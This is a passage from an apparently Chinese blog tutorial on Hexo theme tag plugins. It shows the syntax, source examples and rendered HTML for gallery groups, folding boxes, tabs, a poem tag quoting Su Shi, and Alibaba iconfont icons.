class="line">&#123;% endgallery %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ul><li>gallerygroup 相册图库</li></ul><table><thead><tr><th>参数名</th><th>释义</th></tr></thead><tbody><tr><td>name</td><td>图库名字</td></tr><tr><td>description</td><td>图库描述</td></tr><tr><td>link</td><td>链接到对应相册的地址</td></tr><tr><td>img-url</td><td>图库封面</td></tr></tbody></table><ul><li><p>gallery 相册</p><p>区别于旧版的 Gallery 相册,新的 Gallery 相册会自动根据图片长度进行排版，书写也更加方便，与 markdown 格式一样。可根据需要插入到相应的 md。无需再自己配置长宽。<strong>建议在粘贴时故意使用长短、大小、横竖不一的图片</strong>，会有更好的效果。（尺寸完全相同的图片只会平铺输出，效果很糟糕）</p></li></ul><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.gallerygroup 相册图库</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;gallery-group-main&quot;</span>&gt;</span></span></span><br><span class="line">&#123;% galleryGroup MC 在Rikkaの六花服务器里留下的足迹 &#x27;/gallery/MC/&#x27; https://cdn.cbd.int/akilar-candyassets@1.0.36/image/1.jpg %&#125;</span><br><span class="line">&#123;% galleryGroup Gundam 哦咧哇gundam哒！ &#x27;/gallery/Gundam/&#x27; https://cdn.cbd.int/akilar-candyassets@1.0.36/image/20200907110508327.png %&#125;</span><br><span class="line">&#123;% galleryGroup I-am-Akilar 某种意义上也算自拍吧 &#x27;/gallery/I-am-Akilar/&#x27; https://cdn.cbd.int/akilar-candyassets@1.0.36/image/20200907113116651.png %&#125;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>2.gallery 相册</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% gallery %&#125;</span><br><span class="line">![](<span class="link">https://i.loli.net/2019/12/25/Fze9jchtnyJXMHN.jpg</span>)</span><br><span class="line">![](<span class="link">https://i.loli.net/2019/12/25/ryLVePaqkYm4TEK.jpg</span>)</span><br><span class="line">&#123;% endgallery %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>1.gallerygroup 相册图库</p><div class="gallery-group-main">  <figure class="gallery-group">  <img class="gallery-group-img no-lightbox" src='https://cdn.cbd.int/akilar-candyassets@1.0.36/image/1.jpg' alt="Group Image Gallery">  <figcaption>  <div class="gallery-group-name">MC</div>  <p>在Rikkaの六花服务器里留下的足迹</p>  <a href='/gallery/MC/'></a>  </figcaption>  </figure>  <figure class="gallery-group">  <img class="gallery-group-img no-lightbox" src='https://cdn.cbd.int/akilar-candyassets@1.0.36/image/20200907110508327.png' alt="Group Image Gallery">  <figcaption>  <div class="gallery-group-name">Gundam</div>  <p>哦咧哇gundam哒！</p>  <a href='/gallery/Gundam/'></a>  </figcaption>  </figure>  <figure class="gallery-group">  <img class="gallery-group-img no-lightbox" src='https://cdn.cbd.int/akilar-candyassets@1.0.36/image/20200907113116651.png' alt="Group Image Gallery">  <figcaption>  <div class="gallery-group-name">I-am-Akilar</div>  <p>某种意义上也算自拍吧</p>  <a href='/gallery/I-am-Akilar/'></a>  </figcaption>  </figure></div>2.gallery 相册<div class="fj-gallery"><p><img src="https://i.loli.net/2019/12/25/Fze9jchtnyJXMHN.jpg" alt=""><br><img src="https://i.loli.net/2019/12/25/ryLVePaqkYm4TEK.jpg" alt=""></p>          </div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-20-折叠框-folding">2.20 折叠框 folding</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-3">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><p>1.gallerygroup 相册图库</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% folding 参数（可选）, 标题 %&#125;</span><br><span class="line">![](<span class="link">https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg</span>)</span><br><span class="line">&#123;% endfolding %&#125;</span><br></pre></td></tr></table></figure><!-- tab 参数配置 --><ol><li><p><code>颜色</code>：blue, cyan, green, yellow, red</p></li><li><p><code>状态</code>：状态填写 open 代表默认打开。</p></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&#123;% folding 查看图片测试 %&#125;</span><br><span class="line"></span><br><span class="line">![](<span class="link">https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg</span>)</span><br><span class="line"></span><br><span class="line">&#123;% endfolding %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% folding cyan open, 查看默认打开的折叠框 %&#125;</span><br><span class="line"></span><br><span class="line">这是一个默认打开的折叠框。</span><br><span class="line"></span><br><span class="line">&#123;% endfolding %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% folding green, 查看代码测试 %&#125;</span><br><span class="line">假装这里有代码块（代码块没法嵌套代码块）</span><br><span class="line">&#123;% endfolding %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% folding yellow, 查看列表测试 %&#125;</span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> haha</span><br><span class="line"><span class="bullet">-</span> hehe</span><br><span class="line"></span><br><span class="line">&#123;% endfolding %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% folding red, 查看嵌套测试 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% folding blue, 查看嵌套测试2 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% folding 查看嵌套测试3 %&#125;</span><br><span class="line"></span><br><span class="line">hahaha <span class="language-xml"><span class="tag">&lt;<span class="name">span</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/tieba/%E6%BB%91%E7%A8%BD.png&#x27;</span> <span class="attr">style</span>=<span class="string">&#x27;height:24px&#x27;</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">&#123;% endfolding %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% endfolding %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% endfolding %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><details class="folding-tag" ><summary> 查看图片测试 </summary>              <div class='content'>              <p><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg" alt=""></p>              </div>            </details><details class="folding-tag" cyan open><summary> 查看默认打开的折叠框 </summary>              <div class='content'>              <p>这是一个默认打开的折叠框。</p>              </div>            </details><details class="folding-tag" green><summary> 查看代码测试 </summary>              <div class='content'>              <p>假装这里有代码块（代码块没法嵌套代码块）</p>              </div>            </details><details class="folding-tag" yellow><summary> 查看列表测试 </summary>              <div class='content'>              <ul><li>haha</li><li>hehe</li></ul>              </div>            </details><details class="folding-tag" red><summary> 查看嵌套测试 </summary>              <div class='content'>              <details class="folding-tag" blue><summary> 查看嵌套测试2 </summary>              <div class='content'>              <details class="folding-tag" ><summary> 查看嵌套测试3 </summary>              <div class='content'>              <p>hahaha <span><img src='https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/tieba/%E6%BB%91%E7%A8%BD.png' style='height:24px'></span></p>              </div>            </details>              </div>            </details>              </div>            </details><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-21-分栏-tab">2.21 分栏 tab</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">配置参数</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tabs Unique name, [index] %&#125;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab [Tab caption] [@icon] --&gt;</span><br><span class="line"></span><br><span class="line">Any content (support inline tags too).</span><br><span class="line"></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><p>Unique name :</p><ul><li><p>选项卡块标签的唯一名称，不带逗号。</p></li><li><p>将在#id 中用作每个标签及其索引号的前缀。</p></li><li><p>如果名称中包含空格，则对于生成#id，所有空格将由破折号代替。</p></li><li><p>仅当前帖子/页面的 URL 必须是唯一的！</p></li></ul></li><li><p>[index]:</p><ul><li><p>活动选项卡的索引号。</p></li><li><p>如果未指定，将选择第一个标签（1）。</p></li><li><p>如果 index 为-1，则不会选择任何选项卡。</p></li><li><p>可选参数。</p></li></ul></li><li><p>[Tab caption]:</p><ul><li><p>当前选项卡的标题。</p></li><li><p>如果未指定标题，则带有制表符索引后缀的唯一名称将用作制表符的标题。</p></li><li><p>如果未指定标题，但指定了图标，则标题将为空。</p></li><li><p>可选参数。</p></li></ul></li><li><p>[@icon]:</p><ul><li><p>FontAwesome 图标名称（全名，看起来像“ fas fa-font”）</p></li><li><p>可以指定带空格或不带空格；</p></li><li><p>例如’Tab caption @icon’ 和 ‘Tab caption@icon’.</p></li><li><p>可选参数。</p></li></ul></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.Demo 1 - 预设选择第一个【默认】</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tabs test1 %&#125;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"></span><br><span class="line"><span class="strong">**This is Tab 1.**</span></span><br><span class="line"></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"></span><br><span class="line"><span class="strong">**This is Tab 2.**</span></span><br><span class="line"></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"></span><br><span class="line"><span class="strong">**This is Tab 3.**</span></span><br><span class="line"></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure><p>2.Demo 2 - 预设选择 tabs</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tabs test2, 3 %&#125;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"></span><br><span class="line"><span class="strong">**This is Tab 1.**</span></span><br><span class="line"></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"></span><br><span class="line"><span class="strong">**This is Tab 2.**</span></span><br><span class="line"></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"></span><br><span class="line"><span class="strong">**This is Tab 3.**</span></span><br><span class="line"></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure><p>3.Demo 3 - 没有预设值</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tabs test3, -1 %&#125;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"></span><br><span class="line"><span class="strong">**This is Tab 1.**</span></span><br><span class="line"></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"></span><br><span class="line"><span class="strong">**This is Tab 2.**</span></span><br><span class="line"></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"></span><br><span class="line"><span class="strong">**This is Tab 3.**</span></span><br><span class="line"></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure><p>4.Demo 4 - 自定义 Tab 名 + 只有 icon + icon 和 Tab 名</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tabs test4 %&#125;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab 第一个Tab --&gt;</span><br><span class="line"></span><br><span class="line"><span class="strong">**tab 名字为第一个 Tab**</span></span><br><span class="line"></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab @fab fa-apple-pay --&gt;</span><br><span class="line"></span><br><span class="line"><span class="strong">**只有图标 没有 Tab 名字**</span></span><br><span class="line"></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab 炸弹@fas fa-bomb --&gt;</span><br><span class="line"></span><br><span class="line"><span class="strong">**名字+icon**</span></span><br><span class="line"></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>1.Demo 1 - 预设选择第一个【默认】</p><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">test1 1</button></li><li class="tab"><button type="button" data-href="#test1-2">test1 2</button></li><li class="tab"><button type="button" data-href="#test1-3">test1 3</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><p><strong>This is Tab 1.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><p><strong>This is Tab 2.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-3"><p><strong>This is Tab 3.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><p>2.Demo 2 - 预设选择 tabs</p><div class="tabs" id="test2"><ul class="nav-tabs"><li class="tab"><button type="button" data-href="#test2-1">test2 1</button></li><li class="tab"><button type="button" data-href="#test2-2">test2 2</button></li><li class="tab active"><button type="button" data-href="#test2-3">test2 3</button></li></ul><div class="tab-contents"><div class="tab-item-content" id="test2-1"><p><strong>This is Tab 1.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test2-2"><p><strong>This is Tab 2.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content active" id="test2-3"><p><strong>This is Tab 3.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><p>3.Demo 3 - 没有预设值</p><div class="tabs" id="test3"><ul class="nav-tabs"><li class="tab"><button type="button" data-href="#test3-1">test3 1</button></li><li class="tab"><button type="button" data-href="#test3-2">test3 2</button></li><li class="tab"><button type="button" data-href="#test3-3">test3 3</button></li></ul><div class="tab-contents"><div class="tab-item-content" id="test3-1"><p><strong>This is Tab 1.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test3-2"><p><strong>This is Tab 2.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test3-3"><p><strong>This is Tab 3.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><p>4.Demo 4 - 自定义 Tab 名 + 只有 icon + icon 和 Tab 名</p><div class="tabs" id="test4"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test4-1">第一个Tab</button></li><li class="tab"><button type="button" data-href="#test4-2"><i class="fab fa-apple-pay" style="text-align: center;"></i></button></li><li class="tab"><button type="button" data-href="#test4-3"><i class="fas fa-bomb"></i>炸弹</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test4-1"><p><strong>tab 名字为第一个 Tab</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test4-2"><p><strong>只有图标 没有 Tab 名字</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test4-3"><p><strong>名字+icon</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-22-诗词标签-poem">2.22 诗词标签 poem</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-2">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-3">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><ol><li><code>title</code>：诗词标题</li><li><code>author</code>：作者，可以不写</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;% poem 水调歌头,苏轼 %&#125;</span><br><span class="line">丙辰中秋，欢饮达旦，大醉，作此篇，兼怀子由。</span><br><span class="line">明月几时有？把酒问青天。</span><br><span class="line">不知天上宫阙，今夕是何年？</span><br><span class="line">我欲乘风归去，又恐琼楼玉宇，高处不胜寒。</span><br><span class="line">起舞弄清影，何似在人间？</span><br><span class="line"></span><br><span class="line">转朱阁，低绮户，照无眠。</span><br><span class="line">不应有恨，何事长向别时圆？</span><br><span class="line">人有悲欢离合，月有阴晴圆缺，此事古难全。</span><br><span class="line">但愿人长久，千里共婵娟。</span><br><span class="line">&#123;% endpoem %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><div class='poem'><div class='poem-title'>水调歌头</div><div class='poem-author'>苏轼</div><p>丙辰中秋，欢饮达旦，大醉，作此篇，兼怀子由。<br>明月几时有？把酒问青天。<br>不知天上宫阙，今夕是何年？<br>我欲乘风归去，又恐琼楼玉宇，高处不胜寒。<br>起舞弄清影，何似在人间？</p><p>转朱阁，低绮户，照无眠。<br>不应有恨，何事长向别时圆？<br>人有悲欢离合，月有阴晴圆缺，此事古难全。<br>但愿人长久，千里共婵娟。</p></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-23-阿里图标-icon">2.23 阿里图标 icon</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% icon [icon-xxxx],[font-size] %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>icon-xxxx</code>：表示图标<code>font-class</code>,可以在自己的阿里矢量图标库项目的<code>font-class</code>引用方案内查询并复制。</li><li><code>font-size</code>：表示图标大小，直接填写数字即可，单位为<code>em</code>。图标大小默认值为<code>1em</code>。</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&#123;% icon icon-rat<span class="emphasis">_zi %&#125;&#123;% icon icon-rat,2 %&#125;</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">&#123;% icon icon-ox_</span>chou,3 %&#125;&#123;% icon icon-ox,4 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% icon icon-tiger<span class="emphasis">_yin,5 %&#125;&#123;% icon icon-tiger,6 %&#125;</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">&#123;% icon icon-rabbit_</span>mao,1 %&#125;&#123;% icon icon-rabbit,2 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% icon icon-dragon<span class="emphasis">_chen,3 %&#125;&#123;% icon icon-dragon,4 %&#125;</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">&#123;% icon icon-snake_</span>si,5 %&#125;&#123;% icon icon-snake,6 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% icon icon-horse<span class="emphasis">_wu %&#125;&#123;% icon icon-horse,2 %&#125;</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">&#123;% icon icon-goat_</span>wei,3 %&#125;&#123;% icon icon-goat,4 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% icon icon-monkey<span class="emphasis">_shen,5 %&#125;&#123;% icon icon-monkey,6 %&#125;</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">&#123;% icon icon-rooster_</span>you %&#125;&#123;% icon icon-rooster,2 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% icon icon-dog<span class="emphasis">_xu,3 %&#125;&#123;% icon icon-dog,4 %&#125;</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">&#123;% icon icon-boar_</span>hai,5 %&#125;&#123;% icon icon-boar,6 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p><svg class="icon" style="width:1em; height:1em" aria-hidden="true"><use xlink:href="#icon-rat_zi"></use></svg><svg class="icon" style="width:2em; height:2em" aria-hidden="true"><use xlink:href="#icon-rat"></use></svg></p><p><svg class="icon" style="width:3em; height:3em" aria-hidden="true"><use xlink:href="#icon-ox_chou"></use></svg><svg class="icon" style="width:4em; height:4em" aria-hidden="true"><use xlink:href="#icon-ox"></use></svg></p><p><svg class="icon" style="width:5em; height:5em" aria-hidden="true"><use xlink:href="#icon-tiger_yin"></use></svg><svg class="icon" style="width:6em; height:6em" aria-hidden="true"><use xlink:href="#icon-tiger"></use></svg></p><p><svg class="icon" style="width:1em; height:1em" aria-hidden="true"><use xlink:href="#icon-rabbit_mao"></use></svg><svg class="icon" style="width:2em; height:2em" aria-hidden="true"><use xlink:href="#icon-rabbit"></use></svg></p><p><svg class="icon" style="width:3em; height:3em" aria-hidden="true"><use xlink:href="#icon-dragon_chen"></use></svg><svg class="icon" style="width:4em; height:4em" aria-hidden="true"><use xlink:href="#icon-dragon"></use></svg></p><p><svg class="icon" style="width:5em; height:5em" aria-hidden="true"><use xlink:href="#icon-snake_si"></use></svg><svg class="icon" style="width:6em; height:6em" aria-hidden="true"><use xlink:href="#icon-snake"></use></svg></p><p><svg class="icon" style="width:1em; height:1em" aria-hidden="true"><use xlink:href="#icon-horse_wu"></use></svg><svg class="icon" style="width:2em; height:2em" aria-hidden="true"><use xlink:href="#icon-horse"></use></svg></p><p><svg class="icon" style="width:3em; height:3em" aria-hidden="true"><use xlink:href="#icon-goat_wei"></use></svg><svg class="icon" style="width:4em; height:4em" aria-hidden="true"><use xlink:href="#icon-goat"></use></svg></p><p><svg class="icon" style="width:5em; height:5em" aria-hidden="true"><use xlink:href="#icon-monkey_shen"></use></svg><svg class="icon" style="width:6em; height:6em" aria-hidden="true"><use xlink:href="#icon-monkey"></use></svg></p><p><svg class="icon" style="width:1em; height:1em" aria-hidden="true"><use xlink:href="#icon-rooster_you"></use></svg><svg class="icon" style="width:2em; height:2em" aria-hidden="true"><use xlink:href="#icon-rooster"></use></svg></p><p><svg class="icon" style="width:3em; height:3em" aria-hidden="true"><use xlink:href="#icon-dog_xu"></use></svg><svg class="icon" style="width:4em; height:4em" aria-hidden="true"><use xlink:href="#icon-dog"></use></svg></p><p><svg class="icon" style="width:5em; height:5em" 